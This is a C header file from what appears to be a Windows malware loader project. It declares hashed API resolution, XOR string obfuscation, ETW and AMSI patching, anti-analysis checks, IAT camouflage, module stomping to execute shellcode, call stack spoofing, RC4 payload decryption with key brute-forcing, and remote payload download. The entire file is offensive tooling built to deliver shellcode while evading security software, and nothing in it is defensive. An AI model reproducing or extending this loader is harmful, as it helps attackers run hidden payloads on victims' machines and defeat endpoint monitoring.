#pragma once

// =============================================
// Common Definitions, Hashes, Typedefs
// =============================================

#include <Windows.h>
#include "Structs.h"
#include "Syscalls.h"
#include "Payload.h"

// ----------- Build Config -----------
// Uncomment for debug output (log file)
// #define DEBUG

// Subsystem is controlled by build.bat LFLAGS (/SUBSYSTEM:WINDOWS)

// ----------- Debug Logging -----------
#ifdef DEBUG
    VOID DbgLog(IN LPCSTR msg);
    VOID DbgLogStatus(IN LPCSTR msg, IN NTSTATUS status);
    #define LOG(msg)            DbgLog(msg)
    #define LOG_STATUS(msg, s)  DbgLogStatus(msg, s)
#else
    #define LOG(msg)
    #define LOG_STATUS(msg, s)
#endif

// Custom entry point (CRT-free)
#pragma comment(linker, "/ENTRY:Main")

// ----------- Compiler Settings (CRT-free) -----------
#pragma comment(linker, "/NODEFAULTLIB")
#pragma intrinsic(__movsb)
#pragma intrinsic(__stosb)

// ----------- Syscall Name Hashes (Jenkins One-at-a-Time 32-bit) -----------
#define NtAllocateVirtualMemory_JOAAT   0xE33A06BF
#define NtProtectVirtualMemory_JOAAT    0x82BB0EE0
#define NtDelayExecution_JOAAT          0xC4714BC3

// ----------- Thread Pool Hashes (ntdll exports, resolved via FetchExportAddress) -----------
#define TpAllocWork_JOAAT               0xE6CACAE7
#define TpPostWork_JOAAT                0xBEF96313
#define TpReleaseWork_JOAAT             0xBA0F3087

// ----------- WinAPI Name Hashes -----------
#define LoadLibraryA_JOAAT              0xEC33D795
#define GetProcAddress_JOAAT            0x8F900864
#define GetModuleHandleA_JOAAT          0x9D783EFE
#define VirtualProtect_JOAAT            0x69B260D2
#define EtwEventWrite_JOAAT             0xEF9B6F9B
#define AmsiScanBuffer_JOAAT            0x725879AF
#define SystemFunction032_JOAAT         0xBAE9A924

// ----------- NT Status Codes -----------
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status)  ((NTSTATUS)(Status) >= 0)
#endif

// ----------- Function Typedefs -----------
typedef NTSTATUS(NTAPI* fnSystemFunction032)(PUSTRING Data, PUSTRING Key);
typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI* fnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE (WINAPI* fnGetModuleHandleA)(LPCSTR lpModuleName);
typedef BOOL    (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

// Thread pool function typedefs (ntdll exports)
typedef NTSTATUS(NTAPI* fnTpAllocWork)(PVOID* WorkReturn, PVOID Callback, PVOID Context, PVOID CallbackEnviron);
typedef VOID    (NTAPI* fnTpPostWork)(PVOID Work);
typedef VOID    (NTAPI* fnTpReleaseWork)(PVOID Work);

// ----------- Resolved WinAPI Function Pointers -----------
typedef struct _API_HASHING {
    fnLoadLibraryA      pLoadLibraryA;
    fnGetProcAddress    pGetProcAddress;
    fnGetModuleHandleA  pGetModuleHandleA;
    fnVirtualProtect    pVirtualProtect;
} API_HASHING, * PAPI_HASHING;

// ----------- CRT Replacements (intrinsics) -----------
#define MemCopy(dest, src, size)    __movsb((PBYTE)(dest), (const BYTE*)(src), (size))
#define MemSet(dest, val, size)     __stosb((PBYTE)(dest), (BYTE)(val), (size))

// ----------- String Deobfuscation -----------
// XKEY is defined in Payload.h (randomized per build by Encrypt.py)
#define DEOBF(buf) do { for(DWORD _xi=0; (buf)[_xi]; _xi++) (buf)[_xi] ^= XKEY; } while(0)

// ----------- Helper Functions -----------
UINT32 HashStringJenkinsOneAtATime32BitA(IN PCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitW(IN PWCHAR String);
SIZE_T StrLenA(IN LPCSTR String);
SIZE_T StrLenW(IN LPCWSTR String);
INT    StrCmpA(IN LPCSTR Str1, IN LPCSTR Str2);

// ----------- WinApi Resolution -----------
BOOL InitializeWinApis(OUT PAPI_HASHING pApi);
PVOID FetchModuleBaseAddr(IN UINT32 dwModuleNameHash);
PVOID FetchExportAddress(IN PVOID pModuleBase, IN UINT32 dwApiNameHash);

// ----------- IAT Camouflage -----------
VOID IatCamouflage(VOID);

// ----------- Evasion -----------
BOOL PatchEtw(IN PAPI_HASHING pApi);
BOOL PatchAmsi(IN PAPI_HASHING pApi);
BOOL AntiAnalysis(VOID);

// ----------- Module Stomping -----------
BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);

// ----------- Call Stack Spoofing (ASM) -----------
extern VOID SetSpoofTarget(PVOID pTarget);
extern VOID SpoofCallback(PVOID Instance, PVOID Context, PVOID Work);

// ----------- Crypto -----------
BOOL Rc4DecryptPayload(IN PAPI_HASHING pApi, IN PBYTE pCipherText, IN DWORD dwCipherSize, IN PBYTE pKey, IN DWORD dwKeySize);
BOOL BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKeySize, OUT PBYTE* ppRealKey);

// ----------- Staging -----------
BOOL DownloadPayload(IN PAPI_HASHING pApi, IN LPCSTR szUrl, OUT PBYTE* ppData, OUT PDWORD pdwSize);
